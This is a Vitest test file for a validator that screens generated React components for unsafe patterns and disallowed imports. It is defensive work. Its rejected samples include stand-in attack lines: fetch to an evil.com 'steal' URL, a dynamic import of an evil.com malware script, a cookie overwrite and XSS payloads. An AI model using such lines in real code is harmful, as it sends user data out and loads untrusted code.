import { describe, it, expect } from 'vitest';
import {
  validateComponent,
  validateComponentDetailed,
  type ValidationError,
} from './component-detailed.js';

describe('validateComponent', () => {
  it('should accept valid component code', () => {
    const validCode = `
      import { useState } from 'react';
      import { Container, Button } from '@ggui-ai/design/primitives';

      export default function MyComponent({ onSubmit }) {
        return (
          <Container>
            <Button onClick={() => onSubmit({})}>Submit</Button>
          </Container>
        );
      }
    `;

    expect(() => validateComponent(validCode)).not.toThrow();
  });

  it('should reject code without default export', () => {
    const noExportCode = `
      import { Container } from '@ggui-ai/design/primitives';

      function MyComponent() {
        return <Container />;
      }
    `;

    expect(() => validateComponent(noExportCode)).toThrow(
      'Component must have a default export'
    );
  });

  it('should reject code with eval', () => {
    const evalCode = `
      export default function Component() {
        eval('alert("xss")');
        return <div />;
      }
    `;

    expect(() => validateComponent(evalCode)).toThrow('Security violation');
  });

  it('should reject code with Function constructor', () => {
    const functionCode = `
      export default function Component() {
        const fn = new Function('return 1');
        return <div />;
      }
    `;

    expect(() => validateComponent(functionCode)).toThrow('Security violation');
  });

  it('should reject code with innerHTML', () => {
    const innerHTMLCode = `
      export default function Component() {
        const ref = useRef();
        ref.current.innerHTML = '<script>alert("xss")</script>';
        return <div ref={ref} />;
      }
    `;

    expect(() => validateComponent(innerHTMLCode)).toThrow('Security violation');
  });

  it('should reject code with document access', () => {
    const documentCode = `
      export default function Component() {
        document.cookie = 'stolen';
        return <div />;
      }
    `;

    expect(() => validateComponent(documentCode)).toThrow('Security violation');
  });

  it('should reject code with window access', () => {
    const windowCode = `
      export default function Component() {
        window.location = 'evil.com';
        return <div />;
      }
    `;

    expect(() => validateComponent(windowCode)).toThrow('Security violation');
  });

  it('should reject code with localStorage', () => {
    const localStorageCode = `
      export default function Component() {
        localStorage.setItem('key', 'value');
        return <div />;
      }
    `;

    expect(() => validateComponent(localStorageCode)).toThrow('Security violation');
  });

  it('should reject code with fetch', () => {
    const fetchCode = `
      export default function Component() {
        fetch('https://evil.com/steal');
        return <div />;
      }
    `;

    expect(() => validateComponent(fetchCode)).toThrow('Security violation');
  });

  it('should reject code with dynamic import', () => {
    const dynamicImportCode = `
      export default async function Component() {
        const module = await import('https://evil.com/malware.js');
        return <div />;
      }
    `;

    expect(() => validateComponent(dynamicImportCode)).toThrow('Security violation');
  });

  it('should reject code with script tags', () => {
    const scriptCode = `
      export default function Component() {
        return <div dangerouslySetInnerHTML={{ __html: '<script>alert(1)</script>' }} />;
      }
    `;

    expect(() => validateComponent(scriptCode)).toThrow('Security violation');
  });
});

/**
 * Code Safety Tests (migrated from E2E code-safety.spec.ts)
 *
 * These tests were previously in the E2E tier (ui-generator-fast project)
 * but are purely deterministic regex/validation checks — no Docker, browser,
 * or network needed. They now run as fast unit tests via Vitest.
 */
describe('validateComponentDetailed', () => {
  describe('safe code passes validation', () => {
    it('accepts a valid button component', () => {
      const code = `
        import { useState } from 'react';
        import { Button, Stack } from '@ggui-ai/design/primitives';

        export default function MyButton() {
          const [count, setCount] = useState(0);
          return (
            <Stack gap="md">
              <Button variant="primary" onClick={() => setCount(c => c + 1)}>
                Hello (clicked {count} times)
              </Button>
            </Stack>
          );
        }
      `;
      const result = validateComponentDetailed(code);
      expect(result.valid).toBe(true);
      expect(result.errors).toHaveLength(0);
    });

    it('accepts a valid form component', () => {
      const code = `
        import { useState } from 'react';
        import { Stack, Input, TextArea, Button, Heading, Text } from '@ggui-ai/design/primitives';

        export default function ContactForm({ onSubmit }) {
          const [name, setName] = useState('');
          const [email, setEmail] = useState('');
          const [message, setMessage] = useState('');
          return (
            <Stack gap="lg">
              <Heading level={2}>Contact Us</Heading>
              <Text>Fill out the form below</Text>
              <Stack gap="md">
                <Input label="Name" placeholder="Your name" value={name} onChange={setName} />
                <Input label="Email" type="email" placeholder="your@email.com" value={email} onChange={setEmail} />
                <TextArea label="Message" placeholder="Your message" value={message} onChange={setMessage} />
                <Button variant="primary" onClick={() => onSubmit && onSubmit({ name, email, message })}>
                  Send Message
                </Button>
              </Stack>
            </Stack>
          );
        }
      `;
      const result = validateComponentDetailed(code);
      expect(result.valid).toBe(true);
      expect(result.errors).toHaveLength(0);
    });
  });

  describe('snapshot fixtures pass validation (migrated from E2E)', () => {
    // These are the exact snapshot fixtures from e2e/fixtures/snapshots/
    // Inlined here so unit tests don't depend on E2E fixture files.
    const BALANCED_BUTTON = `import{jsx as e}from"react/jsx-runtime";import{useState as t}from"react";import{Button as n,Stack as r}from"@ggui-ai/design/primitives";function o(){const[s,a]=t(0);return e(r,{gap:"md",children:e(n,{variant:"primary",onClick:()=>a(c=>c+1),children:\`Hello (clicked \${s} times)\`})})}export default o;`;
    const BALANCED_FORM = `import{jsx as e,jsxs as t}from"react/jsx-runtime";import{useState as n}from"react";import{Stack as r,Input as s,TextArea as o,Button as a,Heading as i,Text as l}from"@ggui-ai/design/primitives";function c({onSubmit:d}){const[u,f]=n(""),[p,h]=n(""),[m,g]=n("");return t(r,{gap:"lg",children:[e(i,{level:2,children:"Contact Us"}),e(l,{children:"Fill out the form below"}),t(r,{gap:"md",children:[e(s,{label:"Name",placeholder:"Your name",value:u,onChange:f}),e(s,{label:"Email",type:"email",placeholder:"your@email.com",value:p,onChange:h}),e(o,{label:"Message",placeholder:"Your message",value:m,onChange:g}),e(a,{variant:"primary",onClick:()=>d&&d({name:u,email:p,message:m}),children:"Send Message"})]})]})}export default c;`;

    const snapshots = [
      { name: 'balanced-button', code: BALANCED_BUTTON },
      { name: 'balanced-form', code: BALANCED_FORM },
    ];

    for (const snapshot of snapshots) {
      describe(snapshot.name, () => {
        it('has no security errors', () => {
          const result = validateComponentDetailed(snapshot.code);
          const securityErrors = result.errors.filter(e => e.type === 'security' && !e.message.includes('blueprint literal'));
          expect(securityErrors).toHaveLength(0);
        });

        it('has no import errors', () => {
          const result = validateComponentDetailed(snapshot.code);
          const importErrors = result.errors.filter(e => e.type === 'import');
          expect(importErrors).toHaveLength(0);
        });

        it('has no structure errors', () => {
          const result = validateComponentDetailed(snapshot.code);
          const structureErrors = result.errors.filter(e => e.type === 'structure');
          expect(structureErrors).toHaveLength(0);
        });

        it('does not use eval or Function constructor', () => {
          expect(snapshot.code).not.toMatch(/\beval\s*\(/);
          expect(snapshot.code).not.toMatch(/new\s+Function\s*\(/);
        });

        it('does not use fetch or XMLHttpRequest', () => {
          expect(snapshot.code).not.toMatch(/\bfetch\s*\(/);
          expect(snapshot.code).not.toMatch(/XMLHttpRequest/);
        });

        it('does not use localStorage or sessionStorage', () => {
          expect(snapshot.code).not.toMatch(/localStorage/);
          expect(snapshot.code).not.toMatch(/sessionStorage/);
        });

        it('does not use innerHTML or dangerouslySetInnerHTML', () => {
          expect(snapshot.code).not.toMatch(/innerHTML\s*=/);
          expect(snapshot.code).not.toMatch(/dangerouslySetInnerHTML/);
        });

        it('does not access dangerous window properties', () => {
          expect(snapshot.code).not.toMatch(/window\.location/);
          expect(snapshot.code).not.toMatch(/window\.open\s*\(/);
          expect(snapshot.code).not.toMatch(/window\.alert\s*\(/);
          expect(snapshot.code).not.toMatch(/window\.document/);
        });

        it('does not access document directly', () => {
          expect(snapshot.code).not.toMatch(/document\.getElementById/);
          expect(snapshot.code).not.toMatch(/document\.querySelector/);
          expect(snapshot.code).not.toMatch(/document\.createElement/);
        });

        it('has proper default export', () => {
          const hasExport =
            snapshot.code.includes('export default') ||
            snapshot.code.includes('export{') ||
            /export\s*\{[^}]+as\s+default/.test(snapshot.code);
          expect(hasExport).toBeTruthy();
        });

        it('uses functional component pattern', () => {
          expect(snapshot.code).not.toMatch(/class\s+\w+\s+extends\s+(React\.)?Component/);
          const isFunctional = snapshot.code.includes('function') || snapshot.code.includes('=>');
          expect(isFunctional).toBe(true);
        });

        it('only imports from allowed modules', () => {
          expect(snapshot.code).not.toMatch(/import.*from\s*['"]axios['"]/);
          expect(snapshot.code).not.toMatch(/import.*from\s*['"]lodash['"]/);
          expect(snapshot.code).not.toMatch(/import.*from\s*['"]jquery['"]/);
          expect(snapshot.code).not.toMatch(/import.*from\s*['"]moment['"]/);
        });

        it('imports from design system', () => {
          expect(snapshot.code).toMatch(/@ggui-ai\/design/);
        });
      });
    }
  });

  describe('security violations detected', () => {
    it('detects eval()', () => {
      const code = `
        import { Container } from '@ggui-ai/design/primitives';
        export default function C() { eval('x'); return <Container />; }
      `;
      const result = validateComponentDetailed(code);
      expect(result.valid).toBe(false);
      expect(result.errors.some((e: ValidationError) => e.type === 'security' && e.message.includes('eval()'))).toBe(true);
    });

    it('detects Function constructor', () => {
      const code = `
        import { Container } from '@ggui-ai/design/primitives';
        export default function C() { const f = Function('return 1'); return <Container />; }
      `;
      const result = validateComponentDetailed(code);
      expect(result.valid).toBe(false);
      expect(result.errors.some((e: ValidationError) => e.type === 'security' && e.message.includes('Function constructor'))).toBe(true);
    });

    it('detects fetch()', () => {
      const code = `
        import { Container } from '@ggui-ai/design/primitives';
        export default function C() { fetch('/api'); return <Container />; }
      `;
      const result = validateComponentDetailed(code);
      expect(result.valid).toBe(false);
      expect(result.errors.some((e: ValidationError) => e.type === 'security' && e.message.includes('fetch()'))).toBe(true);
    });

    it('detects XMLHttpRequest', () => {
      const code = `
        import { Container } from '@ggui-ai/design/primitives';
        export default function C() { new XMLHttpRequest(); return <Container />; }
      `;
      const result = validateComponentDetailed(code);
      expect(result.valid).toBe(false);
      expect(result.errors.some((e: ValidationError) => e.type === 'security' && e.message.includes('XMLHttpRequest'))).toBe(true);
    });

    it('detects innerHTML assignment', () => {
      const code = `
        import { Container } from '@ggui-ai/design/primitives';
        export default function C() { ref.innerHTML = '<b>x</b>'; return <Container />; }
      `;
      const result = validateComponentDetailed(code);
      expect(result.valid).toBe(false);
      expect(result.errors.some((e: ValidationError) => e.type === 'security' && e.message.includes('innerHTML'))).toBe(true);
    });

    it('detects dangerouslySetInnerHTML', () => {
      const code = `
        import { Container } from '@ggui-ai/design/primitives';
        export default function C() { return <Container dangerouslySetInnerHTML={{ __html: 'x' }} />; }
      `;
      const result = validateComponentDetailed(code);
      expect(result.valid).toBe(false);
      expect(result.errors.some((e: ValidationError) => e.type === 'security' && e.message.includes('dangerouslySetInnerHTML'))).toBe(true);
    });

    it('detects document access', () => {
      const code = `
        import { Container } from '@ggui-ai/design/primitives';
        export default function C() { document.getElementById('x'); return <Container />; }
      `;
      const result = validateComponentDetailed(code);
      expect(result.valid).toBe(false);
      expect(result.errors.some((e: ValidationError) => e.type === 'security' && e.message.includes('document access'))).toBe(true);
    });

    it('detects window access', () => {
      const code = `
        import { Container } from '@ggui-ai/design/primitives';
        export default function C() { window.location = 'x'; return <Container />; }
      `;
      const result = validateComponentDetailed(code);
      expect(result.valid).toBe(false);
      expect(result.errors.some((e: ValidationError) => e.type === 'security' && e.message.includes('window access'))).toBe(true);
    });

    it('detects localStorage', () => {
      const code = `
        import { Container } from '@ggui-ai/design/primitives';
        export default function C() { localStorage.setItem('k', 'v'); return <Container />; }
      `;
      const result = validateComponentDetailed(code);
      expect(result.valid).toBe(false);
      expect(result.errors.some((e: ValidationError) => e.type === 'security' && e.message.includes('localStorage'))).toBe(true);
    });

    it('detects sessionStorage', () => {
      const code = `
        import { Container } from '@ggui-ai/design/primitives';
        export default function C() { sessionStorage.getItem('k'); return <Container />; }
      `;
      const result = validateComponentDetailed(code);
      expect(result.valid).toBe(false);
      expect(result.errors.some((e: ValidationError) => e.type === 'security' && e.message.includes('sessionStorage'))).toBe(true);
    });

    it('detects WebSocket constructor', () => {
      const code = `
        import { Container } from '@ggui-ai/design/primitives';
        export default function C() { new WebSocket('ws://x'); return <Container />; }
      `;
      const result = validateComponentDetailed(code);
      expect(result.valid).toBe(false);
      expect(result.errors.some((e: ValidationError) => e.type === 'security' && e.message.includes('WebSocket'))).toBe(true);
    });

    it('detects dynamic import', () => {
      const code = `
        import { Container } from '@ggui-ai/design/primitives';
        export default async function C() { await import('evil.js'); return <Container />; }
      `;
      const result = validateComponentDetailed(code);
      expect(result.valid).toBe(false);
      expect(result.errors.some((e: ValidationError) => e.type === 'security' && e.message.includes('dynamic import'))).toBe(true);
    });

    it('detects script tags', () => {
      const code = `
        import { Container } from '@ggui-ai/design/primitives';
        export default function C() { return <Container><script>alert(1)</script></Container>; }
      `;
      const result = validateComponentDetailed(code);
      expect(result.valid).toBe(false);
      expect(result.errors.some((e: ValidationError) => e.type === 'security' && e.message.includes('script tag'))).toBe(true);
    });

    it('detects navigator access', () => {
      const code = `
        import { Container } from '@ggui-ai/design/primitives';
        export default function C() { navigator.clipboard.writeText('x'); return <Container />; }
      `;
      const result = validateComponentDetailed(code);
      expect(result.valid).toBe(false);
      expect(result.errors.some((e: ValidationError) => e.type === 'security' && e.message.includes('navigator access'))).toBe(true);
    });

    it('detects location access', () => {
      const code = `
        import { Container } from '@ggui-ai/design/primitives';
        export default function C() { location.href = 'x'; return <Container />; }
      `;
      const result = validateComponentDetailed(code);
      expect(result.valid).toBe(false);
      expect(result.errors.some((e: ValidationError) => e.type === 'security' && e.message.includes('location access'))).toBe(true);
    });

    it('detects history access', () => {
      const code = `
        import { Container } from '@ggui-ai/design/primitives';
        export default function C() { history.pushState({}, '', '/x'); return <Container />; }
      `;
      const result = validateComponentDetailed(code);
      expect(result.valid).toBe(false);
      expect(result.errors.some((e: ValidationError) => e.type === 'security' && e.message.includes('history access'))).toBe(true);
    });
  });

  describe('import restrictions', () => {
    it('rejects disallowed imports (axios)', () => {
      const code = `
        import axios from 'axios';
        import { Container } from '@ggui-ai/design/primitives';
        export default function C() { return <Container />; }
      `;
      const result = validateComponentDetailed(code);
      expect(result.valid).toBe(false);
      expect(result.errors.some((e: ValidationError) => e.type === 'import' && e.message.includes('axios'))).toBe(true);
    });

    it('rejects disallowed imports (lodash)', () => {
      const code = `
        import _ from 'lodash';
        import { Container } from '@ggui-ai/design/primitives';
        export default function C() { return <Container />; }
      `;
      const result = validateComponentDetailed(code);
      expect(result.valid).toBe(false);
      expect(result.errors.some((e: ValidationError) => e.type === 'import' && e.message.includes('lodash'))).toBe(true);
    });

    it('rejects disallowed imports (jquery)', () => {
      const code = `
        import jQuery from 'jquery';
        import { Container } from '@ggui-ai/design/primitives';
        export default function C() { return <Container />; }
      `;
      const result = validateComponentDetailed(code);
      expect(result.valid).toBe(false);
      expect(result.errors.some((e: ValidationError) => e.type === 'import' && e.message.includes('jquery'))).toBe(true);
    });

    it('rejects disallowed imports (moment)', () => {
      const code = `
        import moment from 'moment';
        import { Container } from '@ggui-ai/design/primitives';
        export default function C() { return <Container />; }
      `;
      const result = validateComponentDetailed(code);
      expect(result.valid).toBe(false);
      expect(result.errors.some((e: ValidationError) => e.type === 'import' && e.message.includes('moment'))).toBe(true);
    });

    it('allows react imports', () => {
      const code = `
        import { useState } from 'react';
        import { Container } from '@ggui-ai/design/primitives';
        export default function C() { return <Container />; }
      `;
      const result = validateComponentDetailed(code);
      expect(result.errors.filter(e => e.type === 'import')).toHaveLength(0);
    });

    it('allows @ggui-ai/design/* imports', () => {
      const code = `
        import { Container } from '@ggui-ai/design/primitives';
        import { SearchField } from '@ggui-ai/design/components';
        export default function C() { return <Container><SearchField /></Container>; }
      `;
      const result = validateComponentDetailed(code);
      expect(result.errors.filter(e => e.type === 'import')).toHaveLength(0);
    });
  });

  describe('structure checks', () => {
    it('requires default export', () => {
      const code = `
        import { Container } from '@ggui-ai/design/primitives';
        function C() { return <Container />; }
      `;
      const result = validateComponentDetailed(code);
      expect(result.valid).toBe(false);
      expect(result.errors.some((e: ValidationError) => e.type === 'structure' && e.message.includes('default export'))).toBe(true);
    });

    it('rejects class components', () => {
      const code = `
        import { Container } from '@ggui-ai/design/primitives';
        class MyComponent extends React.Component {
          render() { return <Container />; }
        }
        export default MyComponent;
      `;
      const result = validateComponentDetailed(code);
      expect(result.valid).toBe(false);
      expect(result.errors.some((e: ValidationError) => e.type === 'structure' && e.message.includes('Class components'))).toBe(true);
    });

    it('rejects class components extending Component without React prefix', () => {
      const code = `
        import { Container } from '@ggui-ai/design/primitives';
        class MyComponent extends Component {
          render() { return <Container />; }
        }
        export default MyComponent;
      `;
      const result = validateComponentDetailed(code);
      expect(result.valid).toBe(false);
      expect(result.errors.some((e: ValidationError) => e.type === 'structure' && e.message.includes('Class components'))).toBe(true);
    });
  });

  describe('size limits', () => {
    it('rejects code exceeding 50KB', () => {
      // 51KB of valid-looking code
      const code = `
        import { Container } from '@ggui-ai/design/primitives';
        export default function C() { return <Container>${'x'.repeat(51 * 1024)}</Container>; }
      `;
      const result = validateComponentDetailed(code);
      expect(result.valid).toBe(false);
      expect(result.errors.some((e: ValidationError) => e.type === 'size' && e.message.includes('too large'))).toBe(true);
    });

    it('rejects code exceeding 500 lines', () => {
      const lines = [
        `import { Container } from '@ggui-ai/design/primitives';`,
        `export default function C() {`,
        ...Array.from({ length: 500 }, (_, i) => `  const x${i} = ${i};`),
        `  return <Container />;`,
        `}`,
      ];
      const code = lines.join('\n');
      const result = validateComponentDetailed(code);
      expect(result.valid).toBe(false);
      expect(result.errors.some((e: ValidationError) => e.type === 'size' && e.message.includes('too many lines'))).toBe(true);
    });
  });

  describe('stats tracking', () => {
    it('reports correct stats for valid code', () => {
      const code = `
        import { useState } from 'react';
        import { Container, Button } from '@ggui-ai/design/primitives';

        export default function MyComponent() {
          return (
            <Container>
              <Button>Click</Button>
            </Container>
          );
        }
      `;
      const result = validateComponentDetailed(code);
      expect(result.stats.importCount).toBe(2);
      expect(result.stats.primitiveCount).toBe(2); // Container + Button
      expect(result.stats.lineCount).toBeGreaterThan(0);
      expect(result.stats.charCount).toBeGreaterThan(0);
    });
  });
});
